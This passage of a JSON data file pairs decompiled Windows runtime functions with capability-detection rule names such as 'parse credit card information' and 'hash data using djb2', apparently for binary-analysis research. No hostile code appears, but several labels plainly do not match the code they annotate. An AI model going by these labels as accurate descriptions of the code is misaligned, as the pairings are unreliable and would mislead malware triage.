goto code_r0x004014e0;\n            case 0x14:\n                if (2 < ppiStack312) {\n                    piVar6 = apiStack284[ppiStack312 + -1];\n                    unaff_EBP = apiStack284[ppiStack312 + -2];\n                    unaff_EDI = apiStack284[ppiStack312 + -3];\n                    apiStack284[ppiStack312 + -1] = unaff_EBP;\n                    apiStack284[ppiStack312 + -2] = unaff_EDI;\n                    apiStack284[ppiStack312 + -3] = piVar6;\n                    goto code_r0x0041a024;\n                }\n                goto code_r0x004014e0;\n            case 0x17:\n            case 0x18:\n            case 0x19:\n            case 0x1a:\n            case 0x1b:\n            case 0x1e:\n            case 0x1f:\n            case 0x21:\n            case 0x22:\n            case 0x23:\n            case 0x24:\n            case 0x26:\n            case 0x27:\n            case 0x28:\n            case 0x29:\n            case 0x2a:\n            case 0x2b:\n                if (ppiStack312 < 2) goto code_r0x004014e0;\n                unaff_EBP = ppiStack312 + -2;\n                ppiVar1 = (&piStack292)[ppiStack312 + 1];\n                unaff_EDI = apiStack284[unaff_EBP];\n                uVar10 = ppiVar1;\n                ppiStack312 = unaff_EBP;\n    // switch table (21 cases) at 0x505a2c\n                switch(uVar7 - 0x1a & 0xff) {\n                case 0:\n                    unaff_EDI = unaff_EDI & ppiVar1;\n                    break;\n                case 1:\n                    unaff_EDI = unaff_EDI / ppiVar1;\n                    break;\n                case 2:\n                    unaff_EDI = unaff_EDI - ppiVar1;\n                    break;\n                case 3:\n                    unaff_EDI = unaff_EDI % ppiVar1;\n                    break;\n                case 4:\n                    unaff_EDI = unaff_EDI * ppiVar1;\n                    break;\n                default:\n                    goto code_r0x0041a4a9;\n                case 7:\n                    unaff_EDI = unaff_EDI | ppiVar1;\n                    break;\n                case 8:\n                    unaff_EDI = unaff_EDI + ppiVar1;\n                    break;\n                case 10:\n                    unaff_EDI = unaff_EDI << (uVar10 & 0x1f);\n                    break;\n                case 0xb:\n                    unaff_EDI = unaff_EDI >> (uVar10 & 0x1f);\n                    break;\n                case 0xc:\n                    unaff_EDI = unaff_EDI >> (uVar10 & 0x1f);\n                    break;\n                case 0xd:\n                    unaff_EDI = unaff_EDI ^ ppiVar1;\n                    break;\n                case 0xf:\n                    unaff_EDI = unaff_EDI == ppiVar1;\n                    break;\n                case 0x10:\n                    unaff_EDI = ppiVar1 <= unaff_EDI;\n                    break;\n                case 0x11:\n                    unaff_EDI = ppiVar1 < unaff_EDI;\n                    break;\n                case 0x12:\n                    unaff_EDI = unaff_EDI <= ppiVar1;\n                    break;\n                case 0x13:\n                    unaff_EDI = unaff_EDI < ppiVar1;\n                    break;\n                case 0x14:\n                    unaff_EDI = unaff_EDI != ppiVar1;\n                }\n                break;\n            case 0x25:\n                if (ppiStack312 != NULL) {\n                    unaff_EDI = ppiStack312 + -1;\n                    puVar8 = in_EAX + 3;\n                    ppiStack312 = unaff_EDI;\n                    if (apiStack284[unaff_EDI] != NULL) {\n                        puVar8 = puVar8 + *(in_EAX + 1);\n                    }\n                    goto code_r0x0041a024;\n                }\n                goto code_r0x004014e0;\n            case 0x2c:\n                puVar8 = in_EAX + *(in_EAX + 1) + 3;\n                goto code_r0x0041a024;\n            case 0x2d:\n            case 0x2e:\n            case 0x2f:\n            case 0x30:\n            case 0x31:\n            case 0x32:\n            case 0x33:\n            case 0x34:\n            case 0x35:\n            case 0x36:\n            case 0x37:\n            case 0x38:\n            case 0x39:\n            case 0x3a:\n            case 0x3b:\n            case 0x3c:\n            case 0x3d:\n            case 0x3e:\n            case 0x3f:\n            case 0x40:\n            case 0x41:\n            case 0x42:\n            case 0x43:\n            case 0x44:\n            case 0x45:\n            case 0x46:\n            case 0x47:\n            case 0x48:\n            case 0x49:\n            case 0x4a:\n            case 0x4b:\n            case 0x4c:\n                unaff_EDI = uVar7 - 0x30;\n                break;\n            case 0x4d:\n            case 0x4e:\n            case 0x4f:\n            case 0x50:\n            case 0x51:\n            case 0x52:\n            case 0x53:\n            case 0x54:\n            case 0x55:\n            case 0x56:\n            case 0x57:\n            case 0x58:\n            case 0x59:\n            case 0x5a:\n            case 0x5b:\n            case 0x5c:\n            case 0x5d:\n            case 0x5e:\n            case 0x5f:\n            case 0x60:\n            case 0x61:\n            case 0x62:\n            case 99:\n            case 100:\n            case 0x65:\n            case 0x66:\n            case 0x67:\n            case 0x68:\n            case 0x69:\n            case 0x6a:\n            case 0x6b:\n            case 0x6c:\n                iVar4 = uVar7 - 0x50;\n                if (0x11 < iVar4) goto code_r0x004014e0;\n                unaff_EDI = *(param_1 + iVar4 * 4);\n                if (((*(param_1 + 99) & 0x40) == 0) || (*(param_1 + 0x6c + iVar4) == '\\0')) {\n                    if (*(uVar7 + 0x5493a4) != '\\x04') goto code_r0x004014e0;\ncode_r0x0041a16c:\n                    unaff_EDI = *unaff_EDI;\n                }\n                break;\n            case 0x6d:\n            case 0x6e:\n            case 0x6f:\n            case 0x70:\n            case 0x71:\n            case 0x72:\n            case 0x73:\n            case 0x74:\n            case 0x75:\n            case 0x76:\n            case 0x77:\n            case 0x78:\n            case 0x79:\n            case 0x7a:\n            case 0x7b:\n            case 0x7c:\n            case 0x7d:\n            case 0x7e:\n            case 0x7f:\n            case 0x80:\n            case 0x81:\n            case 0x82:\n            case 0x83:\n            case 0x84:\n            case 0x85:\n            case 0x86:\n            case 0x87:\n            case 0x88:\n            case 0x89:\n            case 0x8a:\n            case 0x8b:\n            case 0x8c:\n                uVar14 = 0;\n                uVar12 = 0;\n                puVar13 = puVar8;\n                do {\n                    puVar8 = puVar13 + 1;\n                    uVar10 = *puVar13;\n                    uVar11 = uVar12;\n                    uVar12 = uVar12 + 7;\n                    uVar14 = uVar14 | (uVar10 & 0x7f) << (uVar11 & 0x1f);\n                    puVar13 = puVar8;\n                } while (uVar10 < '\\0');\n                if ((uVar12 < 0x20) && ((uVar10 & 0x40) != 0)) {\n                    uVar14 = uVar14 | -(1 << (uVar12 & 0x1f));\n                }\n                iVar4 = uVar7 - 0x70;\n                if (0x11 < iVar4) goto code_r0x004014e0;\n                puVar9 = *(param_1 + iVar4 * 4);\n                if (((*(param_1 + 99) & 0x40) == 0) || (*(param_1 + 0x6c + iVar4) == '\\0')) {\n                    if (*(uVar7 + 0x549384) != '\\x04') goto code_r0x004014e0;\n                    puVar9 = *puVar9;\n                }\n                unaff_EDI = puVar9 + uVar14;\n                break;\n            case 0x8d:\n                uVar7 = 0;\n                uVar10 = 0;\n                puVar13 = puVar8;\n                do {\n                    puVar8 = puVar13 + 1;\n                    uVar11 = *puVar13;\n                    uVar2 = uVar10 & 0x1f;\n                    uVar10 = uVar10 + 7;\n                    uVar7 = uVar7 | (uVar11 & 0x7f) << uVar2;\n                    puVar13 = puVar8;\n                } while (uVar11 < '\\0');\n                if (0x11 < uVar7) goto code_r0x004014e0;\n                unaff_EDI = *(param_1 + uVar7 * 4);\n                if (((*(param_1 + 99) & 0x40) == 0) || (*(param_1 + 0x6c + uVar7) == '\\0')) {\n                    if (*(uVar7 + 0x5493f4) == '\\x04') goto code_r0x0041a16c;\n                    goto code_r0x004014e0;\n                }\n                break;\n            case 0x8f:\n                uVar7 = 0;\n                uVar10 = 0;\n                do {\n                    puVar13 = puVar8 + 1;\n                    uVar11 = *puVar8;\n                    uVar2 = uVar10 & 0x1f;\n                    uVar10 = uVar10 + 7;\n                    uVar7 = uVar7 | (uVar11 & 0x7f) << uVar2;\n                    puVar8 = puVar13;\n                } while (uVar11 < '\\0');\n                uVar14 = 0;\n                uVar12 = 0;\n                do {\n                    puVar8 = puVar13 + 1;\n                    uVar10 = *puVar13;\n                    uVar11 = uVar12;\n                    uVar12 = uVar12 + 7;\n                    uVar14 = uVar14 | (uVar10 & 0x7f) << (uVar11 & 0x1f);\n                    puVar13 = puVar8;\n                } while (uVar10 < '\\0');\n                if ((uVar12 < 0x20) && ((uVar10 & 0x40) != 0)) {\n                    uVar14 = uVar14 | -(1 << (uVar12 & 0x1f));\n                }\n                if (0x11 < uVar7) goto code_r0x004014e0;\n                puVar9 = *(param_1 + uVar7 * 4);\n                if (((*(param_1 + 99) & 0x40) == 0) || (*(param_1 + 0x6c + uVar7) == '\\0')) {\n                    if (*(uVar7 + 0x5493f4) != '\\x04') goto code_r0x004014e0;\n                    puVar9 = *puVar9;\n                }\n                unaff_EDI = uVar14 + puVar9;\n                break;\n            case 0x93:\n                goto code_r0x0041a024;\n            case 0xee:\n                fcn.004190f0();\n                puVar8 = fcn.00418fb0(&piStack292 + 1);\n                unaff_EDI = ppiStack288;\n            }\ncode_r0x0041a010:\n            if (0x3f < ppiStack312) goto code_r0x004014e0;\n            apiStack284[ppiStack312] = unaff_EDI;\n            unaff_EBP = ppiStack312;\n            ppiStack312 = ppiStack312 + 1;\ncode_r0x0041a024:\n            in_EAX = puVar8;\n        } while (puVar8 < param_2);\n        if (ppiStack312 == NULL) {\ncode_r0x004014e0:\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            sub.msvcrt.dll_abort();\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n            if (iVar4 == 0) {\n                *0x4ae004 = 0x41ca80;\n                pcVar5 = 0x41c830;\n            }\n            else {\n                *0x549df0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n                pcVar3 = _sym.imp.KERNEL32.dll_GetProcAddress;\n                pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar4, \"__register_frame_info\");\n                *0x4ae004 = (*pcVar3)(iVar4, \"__deregister_frame_info\");\n            }\n            if (pcVar5 != NULL) {\n                (*pcVar5)(0x50c0f8, 0x54901c);\n            }\n            piVar6 = fcn.004014c0(fcn.00401590);\n            return piVar6;\n        }\n        param_3 = (&piStack292)[ppiStack312 + 1];\n    }\n    return param_3;\n}\n",
        "token_count": 5318
    },
    "00420af0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nint32_t fcn.00420af0(int32_t param_1, int32_t param_2)\n\n{\n    ushort *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    ushort *puVar7;\n    ushort *puVar8;\n    uint32_t uVar9;\n    uint32_t *puVar10;\n    uint32_t *puVar11;\n    int32_t iStack40;\n    int32_t iStack36;\n    \n    iVar2 = param_2;\n    if (*(param_2 + 0x10) <= *(param_1 + 0x10)) {\n        param_2 = param_1;\n        param_1 = iVar2;\n    }\n    puVar10 = param_1 + 0x14;\n    uVar9 = 0;\n    iVar6 = fcn.004269b0(*(param_2 + 4));\n    iStack36 = *(param_2 + 0x10);\n    *(iVar6 + 0x10) = iStack36;\n    iVar2 = *(param_1 + 0x10);\n    puVar1 = iVar6 + 0x14 + iVar2 * 2;\n    puVar11 = param_2 + 0x14;\n    puVar7 = iVar6 + 0x14;\n    do {\n        uVar3 = *puVar11;\n        uVar4 = *puVar10;\n        puVar11 = puVar11 + 1;\n        puVar10 = puVar10 + 1;\n        puVar8 = puVar7 + 2;\n        uVar9 = (uVar4 & 0xffff) + (uVar3 & 0xffff) + uVar9;\n        *puVar7 = uVar9;\n        uVar9 = (uVar3 >> 0x10) + (uVar4 >> 0x10) + (uVar9 >> 0x10);\n        puVar7[1] = uVar9;\n        uVar9 = uVar9 >> 0x10;\n        puVar7 = puVar8;\n    } while (puVar8 < puVar1);\n    iVar5 = *(param_2 + 0x10);\n    for (; puVar8 < puVar1 + (iVar5 - iVar2) * 2; puVar8 = puVar8 + 2) {\n        uVar3 = *puVar11;\n        puVar11 = puVar11 + 1;\n        uVar9 = (uVar3 & 0xffff) + uVar9;\n        *puVar8 = uVar9;\n        uVar9 = (uVar3 >> 0x10) + (uVar9 >> 0x10);\n        puVar8[1] = uVar9;\n        uVar9 = uVar9 >> 0x10;\n    }\n    iStack40 = iVar6;\n    if (uVar9 != 0) {\n        if (iStack36 == *(iVar6 + 8)) {\n            iStack40 = fcn.004269b0(*(iVar6 + 4) + 1);\n            sub.msvcrt.dll_memcpy(iStack40 + 0xc, iVar6 + 0xc, *(iVar6 + 0x10) * 4 + 8);\n            fcn.00426a80(iVar6);\n            iStack36 = *(iStack40 + 0x10);\n        }\n        *(iStack40 + 0x10) = iStack36 + 1;\n        *(iStack40 + 0x14 + iStack36 * 4) = 1;\n    }\n    return iStack40;\n}\n",
        "token_count": 818
    },
    "00416f30": {
        "rules": [
            "parse credit card information/e6f146abe79f47cd84115fe8b7938431"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00416f30(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    char cVar4;\n    uchar uVar5;\n    char *pcVar6;\n    uchar *puVar7;\n    \n    pcVar6 = **(param_1 + 8);\n    if (*pcVar6 != 'f') {\n        return 0;\n    }\n    uVar1 = *(in_EAX + 0x124);\n    *(in_EAX + 0x124) = 0xffffffff;\n    cVar4 = pcVar6[1];\n    if (cVar4 == 'R') {\ncode_r0x004170f4:\n        if (*(in_EAX + 0x100) == 0xff) {\n            *(in_EAX + 0xff) = 0;\n            (**(in_EAX + 0x108))();\n            *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n            *(in_EAX + 0x100) = 0;\n        }\n        iVar3 = *(in_EAX + 0x100);\n        *(in_EAX + 0x100) = iVar3 + 1;\n        *(in_EAX + iVar3) = 0x28;\n        *(in_EAX + 0x104) = 0x28;\n        fcn.00416e40();\n        puVar7 = 0x503d4c;\n        fcn.00416da0();\n        uVar5 = 0x2e;\n        iVar3 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar3 == 0xff) {\n                *(in_EAX + 0xff) = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar2 = 1;\n                iVar3 = 0;\n            }\n            else {\n                iVar2 = iVar3 + 1;\n            }\n            puVar7 = puVar7 + 1;\n            *(in_EAX + 0x100) = iVar2;\n            *(in_EAX + iVar3) = uVar5;\n            *(in_EAX + 0x104) = uVar5;\n            if (puVar7 == 0x503d4f) break;\n            uVar5 = *puVar7;\n            iVar3 = iVar2;\n        }\n        fcn.00416da0();\n    }\n    else {\n        if (cVar4 < 'S') {\n            if (cVar4 != 'L') goto code_r0x004170d0;\n            goto code_r0x004170f4;\n        }\n        if (cVar4 != 'l') {\n            if (cVar4 == 'r') {\n                iVar2 = *(in_EAX + 0x100);\n                iVar3 = iVar2 + 1;\n                if (iVar2 == 0xff) {\n                    *(in_EAX + 0xff) = 0;\n                    (**(in_EAX + 0x108))();\n                    *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                    iVar3 = 1;\n                    iVar2 = 0;\n                }\n                *(in_EAX + 0x100) = iVar3;\n                pcVar6 = \"...)\";\n                *(in_EAX + iVar2) = 0x28;\n                *(in_EAX + 0x104) = 0x28;\n                fcn.00416e40();\n                fcn.00416da0();\n                cVar4 = '.';\n                iVar3 = *(in_EAX + 0x100);\n                while( true ) {\n                    if (iVar3 == 0xff) {\n                        *(in_EAX + 0xff) = 0;\n                        (**(in_EAX + 0x108))();\n                        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                        iVar2 = 1;\n                        iVar3 = 0;\n                    }\n                    else {\n                        iVar2 = iVar3 + 1;\n                    }\n                    pcVar6 = pcVar6 + 1;\n                    *(in_EAX + 0x100) = iVar2;\n                    *(in_EAX + iVar3) = cVar4;\n                    *(in_EAX + 0x104) = cVar4;\n                    if (pcVar6 == \"\") break;\n                    cVar4 = *pcVar6;\n                    iVar3 = iVar2;\n                }\n            }\n            goto code_r0x004170d0;\n        }\n        pcVar6 = \"(...\";\n        cVar4 = '(';\n        iVar3 = *(in_EAX + 0x100);\n        while( true ) {\n            if (iVar3 == 0xff) {\n                *(in_EAX + 0xff) = 0;\n                (**(in_EAX + 0x108))();\n                *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n                iVar2 = 1;\n                iVar3 = 0;\n            }\n            else {\n                iVar2 = iVar3 + 1;\n            }\n            pcVar6 = pcVar6 + 1;\n            *(in_EAX + 0x100) = iVar2;\n            *(in_EAX + iVar3) = cVar4;\n            *(in_EAX + 0x104) = cVar4;\n            if (pcVar6 == \"\") break;\n            cVar4 = *pcVar6;\n            iVar3 = iVar2;\n        }\n        fcn.00416da0();\n    }\n    fcn.00416e40();\n    iVar2 = *(in_EAX + 0x100);\n    iVar3 = iVar2 + 1;\n    if (iVar2 == 0xff) {\n        *(in_EAX + 0xff) = 0;\n        (**(in_EAX + 0x108))();\n        *(in_EAX + 0x128) = *(in_EAX + 0x128) + 1;\n        iVar3 = 1;\n        iVar2 = 0;\n    }\n    *(in_EAX + 0x100) = iVar3;\n    *(in_EAX + iVar2) = 0x29;\n    *(in_EAX + 0x104) = 0x29;\ncode_r0x004170d0:\n    *(in_EAX + 0x124) = uVar1;\n    return 1;\n}\n",
        "token_count": 1465
    },
    "00470ba0": {
        "rules": [
            "parse credit card information/e6f146abe79f47cd84115fe8b7938431"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.00470ba0(int32_t *param_1, uint param_2, uint32_t param_3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = (param_3 & 0x3d) - 1;\n    if (((uVar2 < 0x3c) && (iVar1 = *(uVar2 * 4 + 0x506360),  iVar1 != 0)) && (*param_1 == 0)) {\n        iVar1 = fcn.0041e390(param_2, iVar1);\n        *param_1 = iVar1;\n        if (iVar1 != 0) {\n            *(param_1 + 1) = 1;\n            return param_1;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 186
    },
    "0041d150": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nfloat10 fcn.0041d150(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    uint uStack36;\n    uint32_t uStack32;\n    int32_t iStack24;\n    uint uStack20;\n    uint32_t uStack16;\n    \n    uVar1 = fcn.0041ef70(param_1, param_2, 0x4f5a10, &iStack24, &uStack20);\n    // switch table (7 cases) at 0x505ad4\n    switch(uVar1 & 7) {\n    case 0:\n    case 6:\n        uStack36 = 0;\n        uStack32 = 0;\n        break;\n    case 1:\n        uStack36 = uStack20;\n        uStack32 = (iStack24 + 0x433) * 0x100000 | uStack16 & 0xffefffff;\n        break;\n    case 2:\n        uStack36 = uStack20;\n        uStack32 = uStack16;\n        break;\n    case 3:\n        uStack36 = 0;\n        uStack32 = 0x7ff00000;\n        break;\n    case 4:\n        uStack36 = 0;\n        uStack32 = 0x7ff80000;\n        break;\n    case 5:\n        uStack32 = uStack16 | 0x7ff00000;\n        uStack36 = uStack20;\n    }\n    if ((uVar1 & 8) != 0) {\n        uStack32 = uStack32 | 0x80000000;\n    }\n    return CONCAT44(uStack32, uStack36);\n}\n",
        "token_count": 372
    },
    "004a3c60": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nint32_t fcn.004a3c60(int32_t *param_1, int32_t param_2, uint param_3, int32_t param_4)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t *unaff_EBX;\n    int32_t iVar4;\n    uint32_t uStack64;\n    uint uStack20;\n    \n    piVar1 = *(*param_1 + -4);\n    piVar3 = *(*param_1 + -8) + param_1;\n    if ((*(*piVar3 + -4) == piVar1) &&\n       (iVar4 = param_4,  (**(*piVar1 + 0x1c))(param_4, 6, param_3, piVar3),  param_2 != 0)) {\n        if ((uStack64 & 6) == 6) {\n            return param_2;\n        }\n        if (uStack64 == 0) {\n            if (param_4 < 0) {\n                if ((param_4 != -2) &&\n                   (uVar2 = (**(*unaff_EBX + 0x20))(param_4, param_2, uStack20, param_1),  (uVar2 & 6) == 6)) {\n                    return iVar4;\n                }\n            }\n            else if (param_1 == param_4 + param_2) {\n                return param_2;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 340
    },
    "00427350": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nvoid fcn.00427350(ulong param_1, int32_t *param_2, int32_t *param_3)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uStack36;\n    uint32_t uStack32;\n    \n    iVar4 = fcn.004269b0(1);\n    if (iVar4 != 0) {\n        uStack32 = param_1 >> 0x20;\n        uVar8 = uStack32 >> 0x14 & 0x7ff;\n        uVar5 = uStack32 & 0xfffff;\n        if (uVar8 != 0) {\n            uVar5 = uStack32 & 0xfffff | 0x100000;\n        }\n        uStack36 = param_1;\n        if (uStack36 == 0) {\n            *(iVar4 + 0x10) = 1;\n            iVar6 = 0;\n            for (uVar7 = uVar5; (uVar7 & 1) == 0; uVar7 = uVar7 >> 1 | 0x80000000) {\n                iVar6 = iVar6 + 1;\n            }\n            iVar2 = iVar6 + 0x20;\n            *(iVar4 + 0x14) = uVar5 >> (iVar6 & 0x1f);\n            iVar6 = 1;\n        }\n        else {\n            iVar2 = 0;\n            for (uVar7 = uStack36; (uVar7 & 1) == 0; uVar7 = uVar7 >> 1 | 0x80000000) {\n                iVar2 = iVar2 + 1;\n            }\n            if (iVar2 == 0) {\n                *(iVar4 + 0x14) = uStack36;\n            }\n            else {\n                uVar3 = iVar2;\n                uVar7 = uVar5 << (0x20 - uVar3 & 0x1f);\n                uVar5 = uVar5 >> (uVar3 & 0x1f);\n                *(iVar4 + 0x14) = uVar7 | uStack36 >> (uVar3 & 0x1f);\n            }\n            *(iVar4 + 0x18) = uVar5;\n            iVar6 = (uVar5 != 0) + 1;\n            *(iVar4 + 0x10) = iVar6;\n        }\n        if (uVar8 == 0) {\n            puVar1 = iVar4 + 0x10 + iVar6 * 4;\n            uVar5 = 0x1f;\n            if (*puVar1 != 0) {\n                for (; *puVar1 >> uVar5 == 0; uVar5 = uVar5 - 1) {\n                }\n            }\n            *param_2 = iVar2 + -0x432;\n            *param_3 = iVar6 * 0x20 - (uVar5 ^ 0x1f);\n            return;\n        }\n        *param_2 = (uVar8 - 0x433) + iVar2;\n        *param_3 = 0x35 - iVar2;\n    }\n    return;\n}\n",
        "token_count": 748
    },
    "00427560": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nfloat10 fcn.00427560(int32_t param_1, int32_t param_2)\n\n{\n    double dVar1;\n    double dVar2;\n    float10 fVar3;\n    int32_t iStack56;\n    int32_t iStack48;\n    int32_t iStack20;\n    int32_t aiStack16 [2];\n    \n    fVar3 = fcn.00427250(param_1, &iStack20);\n    dVar1 = fVar3;\n    iStack56 = dVar1 >> 0x20;\n    fVar3 = fcn.00427250(param_2, aiStack16);\n    dVar2 = fVar3;\n    aiStack16[0] = ((*(param_1 + 0x10) - *(param_2 + 0x10)) * 0x20 + iStack20) - aiStack16[0];\n    if (0 < aiStack16[0]) {\n        return (dVar1 & 0xffffffff | aiStack16[0] * 0x100000 + iStack56 << 0x20) / dVar2;\n    }\n    iStack48 = dVar2 >> 0x20;\n    return dVar1 / (dVar2 & 0xffffffff | iStack48 + aiStack16[0] * -0x100000 << 0x20);\n}\n",
        "token_count": 300
    },
    "00427a10": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nint32_t fcn.00427a10(int32_t param_1)\n\n{\n    return param_1 * 0x20 + _sym.imp.msvcrt.dll__iob;\n}\n",
        "token_count": 42
    },
    "00417a80": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.00417a80(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (*0x549048 != 0) {\n        return;\n    }\n    *0x549048 = 1;\n    iVar2 = *0x4a6a10;\n    if (*0x4a6a10 == -1) {\n        iVar1 = 0;\n        do {\n            iVar2 = iVar1;\n            iVar1 = iVar2 + 1;\n        } while (*((iVar2 + 1) * 4 + 0x4a6a10) != 0);\n    }\n    for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n        (**(iVar2 * 4 + 0x4a6a10))();\n    }\n    fcn.004014c0(0x4179f0);\n    return;\n}\n",
        "token_count": 198
    },
    "0041b630": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b630(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    uVar1 = *(param_1 + 4);\n    uVar4 = uVar1 >> 1;\n    while (uVar4 = uVar4 - 1,  uVar4 != 0xffffffff) {\n        fcn.0041b570(uVar4, uVar1);\n    }\n    iVar3 = uVar1 - 1;\n    if (0 < iVar3) {\n        do {\n            uVar2 = *(param_1 + 8);\n            *(param_1 + 8) = *(param_1 + 8 + iVar3 * 4);\n            *(param_1 + 8 + iVar3 * 4) = uVar2;\n            fcn.0041b570(0, iVar3);\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 236
    },
    "0041ce20": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.0041ce20(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    \n    *0x549424 = 0xffffffff;\n    *0x549428 = (*_sym.imp.KERNEL32.dll_CreateSemaphoreW)(0, 0, 0xffff, 0);\n    iVar3 = (*_sym.imp.KERNEL32.dll_TlsAlloc)();\n    if (iVar3 == -1) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        *0x549420 = iVar3;\n        iVar3 = fcn.00427b50(iVar3, 0x41cd40);\n    }\n    if (iVar3 == 0) {\n        return;\n    }\n    sub.msvcrt.dll_abort();\n    sub.msvcrt.dll_abort();\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"libgcc_s_dw2-1.dll\");\n    if (iVar3 == 0) {\n        *0x4ae004 = 0x41ca80;\n        pcVar2 = 0x41c830;\n    }\n    else {\n        *0x549df0 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"libgcc_s_dw2-1.dll\");\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"__register_frame_info\");\n        *0x4ae004 = (*pcVar1)(iVar3, \"__deregister_frame_info\");\n    }\n    if (pcVar2 != NULL) {\n        (*pcVar2)(0x50c0f8, 0x54901c);\n    }\n    fcn.004014c0(fcn.00401590);\n    return;\n}\n",
        "token_count": 400
    },
    "0041d300": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0041d300(int32_t param_1)\n\n{\n    uint uVar1;\n    uchar uStack15;\n    ushort auStack14 [7];\n    \n    uVar1 = 0xffffffff;\n    if (param_1 != -1) {\n        uStack15 = param_1;\n        auStack14[0] = 0xffff;\n        uVar1 = fcn.00427b10();\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(uVar1, 8, &uStack15, 1, auStack14);\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 144
    },
    "0041ea30": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.0041ea30(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar4 = *(param_1 + 0x10);\n    piVar2 = param_1 + 0x14;\n    do {\n        if (*piVar2 != -1) {\n            *piVar2 = *piVar2 + 1;\n            return param_1;\n        }\n        piVar1 = piVar2 + 1;\n        *piVar2 = 0;\n        piVar2 = piVar1;\n    } while (piVar1 < param_1 + 0x14 + iVar4);\n    iVar3 = param_1;\n    if (*(param_1 + 8) <= iVar4) {\n        iVar3 = fcn.004269b0(*(param_1 + 4) + 1);\n        sub.msvcrt.dll_memcpy(iVar3 + 0xc, param_1 + 0xc, *(param_1 + 0x10) * 4 + 8);\n        fcn.00426a80(param_1);\n        iVar4 = *(iVar3 + 0x10);\n    }\n    *(iVar3 + 0x10) = iVar4 + 1;\n    *(iVar3 + 0x14 + iVar4 * 4) = 1;\n    return iVar3;\n}\n",
        "token_count": 322
    },
    "00422b20": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
